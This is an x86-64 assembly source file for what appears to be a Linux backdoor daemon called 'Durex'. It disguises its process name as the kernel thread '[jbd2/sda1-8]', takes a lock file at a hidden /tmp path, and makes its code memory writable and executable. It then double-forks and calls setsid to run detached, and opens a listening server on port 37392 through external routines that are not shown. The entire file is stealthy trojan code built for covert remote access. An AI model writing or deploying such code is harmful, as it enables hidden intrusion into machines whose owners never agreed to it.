BITS 64

section .text
    global _start
    extern create_server
    extern loop_server

_start:
    push    rbp
    mov     rbp, rsp
    call    check_instance
    mov     rdi, [rbp + 0x10]
    lea     rsi, [rel pname]
    call    strcpy
    lea     rdi, [$$]
    xor     rsi, rsi
    xor     rdx, rdx
    xor     eax, eax
    add     rsi, 0x1000
    add     rdx, 0x1 | 0x2 | 0x4 ; PROT_READ | PROT_WRITE | PROT_EXEC
    add     eax, 0xa ; mprotect
    syscall
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     rax, 0
    jne     exit
    xor     eax, eax
    add     eax, 0x70 ; setsid
    syscall
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    jne     exit
    mov     rdi, DWORD 37392
    call    create_server
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    jne     fork2
    mov     rax, [rbp + 0x10]
    mov     BYTE [rax + 0xb], 54
    jmp     connect
fork2:
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    jne     connect
    mov     rax, [rbp + 0x10]
    mov     BYTE [rax + 0xb], 55
connect:
    call    loop_server

exit:
    xor     rdi, rdi
    xor     eax, eax
    add     eax, 0x3c ; exit
    syscall
    ret 

strcpy:
    mov     al, [rsi]
    mov     [rdi], al
    mov     bl, [rsi]
    cmp     bl, 0
    je      end_strcpy
    inc     rdi
    inc     rsi
    jmp     strcpy
end_strcpy:
    ret

check_instance:
    xor     rsi, rsi
    xor     rdx, rdx
    xor     rax, rax
    lea     rdi, [rel lock_name]
    add     esi, 2 | 0100 ; O_RDWR | O_CREAT
    add     edx, 0600
    add     eax, 0x02 ; open
    syscall
    mov     edx, eax
    mov     edi, edx
    xor     esi, esi
    add     esi, 2 | 4 ; LOCK_EX| LOCK_NB
    xor     eax, eax
    add     eax, 0x49 ; flock
    syscall
    cmp     eax, 0
    jne     exit
    mov     edi, edx
    xor     eax, eax
    add     eax, 0x03 ; close
    syscall
    ret

    lock_name: db "/tmp/.Durex.lock", 0
    pname: db "[jbd2/sda1-8]", 0